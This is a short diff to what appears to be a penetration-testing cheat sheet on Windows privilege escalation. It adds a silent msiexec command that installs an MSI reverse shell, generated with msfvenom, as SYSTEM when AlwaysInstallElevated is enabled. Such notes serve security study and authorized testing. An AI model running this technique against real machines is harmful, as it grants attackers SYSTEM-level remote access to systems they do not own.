@@ -10,3 +10,9 @@ If they are "0x1" you can install an .msi file as NT AUTHORITY\System
 # reverse shell
 
 check msfvenom in general to generate msi reverse shell
+
+# install msi
+
+```cmd
+msiexec /quiet /qn /i reverse.msi
+```
